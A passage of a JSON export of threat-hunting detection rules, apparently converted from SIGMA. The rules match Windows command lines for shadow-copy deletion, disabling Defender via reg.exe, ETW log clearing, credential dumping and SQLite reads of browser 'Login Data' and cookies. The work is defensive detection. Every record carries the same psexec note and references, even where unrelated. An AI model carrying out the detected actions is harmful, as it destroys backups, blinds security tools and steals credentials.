            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wab.exe\" or tgt.process.image.path contains \"\\wabmig.exe\") and (not (tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\" or tgt.process.image.path contains \"C:\\Program Files\\Windows Mail\\\" or tgt.process.image.path contains \"C:\\Program Files (x86)\\Windows Mail\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 922
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network sniffing via use of network tools such as \"tshark\", \"windump\".\nNetwork sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1040"
            ],
            "name": "Potential Network Sniffing Activity Using Network Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\tshark.exe\" and tgt.process.cmdline contains \"-i\") or tgt.process.image.path contains \"\\windump.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 923
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Renamed Jusched.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName in (\"Java Update Scheduler\",\"Java(TM) Update Scheduler\")) and (not tgt.process.image.path contains \"\\jusched.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 924
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1070",
                "t1562"
            ],
            "name": "ETW Trace Evasion Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"cl\" and tgt.process.cmdline contains \"/Trace\") or (tgt.process.cmdline contains \"clear-log\" and tgt.process.cmdline contains \"/Trace\") or (tgt.process.cmdline contains \"sl\" and tgt.process.cmdline contains \"/e:false\") or (tgt.process.cmdline contains \"set-log\" and tgt.process.cmdline contains \"/e:false\") or (tgt.process.cmdline contains \"logman\" and tgt.process.cmdline contains \"update\" and tgt.process.cmdline contains \"trace\" and tgt.process.cmdline contains \"--p\" and tgt.process.cmdline contains \"-ets\") or tgt.process.cmdline contains \"Remove-EtwTraceProvider\" or (tgt.process.cmdline contains \"Set-EtwTraceProvider\" and tgt.process.cmdline contains \"0x11\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 925
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Execute From Alternate Data Streams",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"txt:\" and ((tgt.process.cmdline contains \"type \" and tgt.process.cmdline contains \" > \") or (tgt.process.cmdline contains \"makecab \" and tgt.process.cmdline contains \".cab\") or (tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \" export \") or (tgt.process.cmdline contains \"regedit \" and tgt.process.cmdline contains \" /E \") or (tgt.process.cmdline contains \"esentutl \" and tgt.process.cmdline contains \" /y \" and tgt.process.cmdline contains \" /d \" and tgt.process.cmdline contains \" /o \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 926
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious RDP session redirect using tscon.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1563",
                "t1021"
            ],
            "name": "Suspicious RDP Redirect Using TSCON",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \" /dest:rdp-tcp#\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 927
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "PsExec Service Child Process Execution as LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\Windows\\PSEXESVC.exe\" and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 928
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a Windows command line executable started from MMC",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "MMC Spawning Windows Shell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\mmc.exe\" and ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\") or tgt.process.image.path contains \"\\BITSADMIN\"))) | columns tgt.process.cmdline,tgt.process.image.path,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 929
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to \"LoadAssemblyFromPath\" or \"LoadAssemblyFromNS\" that are part of the \"CL_LoadAssembly.ps1\" script. This can be abused to load different assemblies and bypass App locker controls.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Assembly Loading Via CL_LoadAssembly.ps1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"LoadAssemblyFromPath \" or tgt.process.cmdline contains \"LoadAssemblyFromNS \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 930
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execution via stordiag.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\stordiag.exe\" and (tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\fltmc.exe\")) and (not (src.process.image.path contains \"c:\\windows\\system32\\\" or src.process.image.path contains \"c:\\windows\\syswow64\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 931
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1490"
            ],
            "name": "Deletion of Volume Shadow Copies via WMI with PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Get-WmiObject\" or tgt.process.cmdline contains \"gwmi\" or tgt.process.cmdline contains \"Get-CimInstance\" or tgt.process.cmdline contains \"gcim\") and tgt.process.cmdline contains \"Win32_ShadowCopy\" and (tgt.process.cmdline contains \".Delete()\" or tgt.process.cmdline contains \"Remove-WmiObject\" or tgt.process.cmdline contains \"rwmi\" or tgt.process.cmdline contains \"Remove-CimInstance\" or tgt.process.cmdline contains \"rcim\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 932
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Potential Credential Dumping Attempt Using New NetworkProvider - CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Services\\\" and tgt.process.cmdline contains \"\\NetworkProvider\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 933
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1539",
                "t1555",
                "t1005"
            ],
            "name": "SQLite Chromium Profile Data DB Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName=\"SQLite\" or (tgt.process.image.path contains \"\\sqlite.exe\" or tgt.process.image.path contains \"\\sqlite3.exe\")) and (tgt.process.cmdline contains \"\\User Data\\\" or tgt.process.cmdline contains \"\\Opera Software\\\" or tgt.process.cmdline contains \"\\ChromiumViewer\\\") and (tgt.process.cmdline contains \"Login Data\" or tgt.process.cmdline contains \"Cookies\" or tgt.process.cmdline contains \"Web Data\" or tgt.process.cmdline contains \"History\" or tgt.process.cmdline contains \"Bookmarks\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 934
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - LogMeIn Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"LMIGuardianSvc\" or tgt.process.displayName=\"LMIGuardianSvc\" or tgt.process.publisher=\"LogMeIn, Inc.\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 935
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"reg.exe\" to disable security services such as Windows Defender.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Security Service Disabled Via Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\") and ((tgt.process.cmdline contains \"d 4\" and tgt.process.cmdline contains \"v Start\") and (tgt.process.cmdline contains \"\\AppIDSvc\" or tgt.process.cmdline contains \"\\MsMpSvc\" or tgt.process.cmdline contains \"\\NisSrv\" or tgt.process.cmdline contains \"\\SecurityHealthService\" or tgt.process.cmdline contains \"\\Sense\" or tgt.process.cmdline contains \"\\UsoSvc\" or tgt.process.cmdline contains \"\\WdBoot\" or tgt.process.cmdline contains \"\\WdFilter\" or tgt.process.cmdline contains \"\\WdNisDrv\" or tgt.process.cmdline contains \"\\WdNisSvc\" or tgt.process.cmdline contains \"\\WinDefend\" or tgt.process.cmdline contains \"\\wscsvc\" or tgt.process.cmdline contains \"\\wuauserv\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 936
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldn't have any child processes.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Spawned By Odbcconf.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\odbcconf.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 937
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Compress Data and Lock With Password for Exfiltration With WINZIP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"winzip.exe\" or tgt.process.cmdline contains \"winzip64.exe\") and tgt.process.cmdline contains \"-s\\\"\" and (tgt.process.cmdline contains \" -min \" or tgt.process.cmdline contains \" -a \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 938
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of schtasks with the delete flag and the asterisk symbol to delete all tasks from the schedule of the local computer, including tasks scheduled by other users.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1489"
            ],
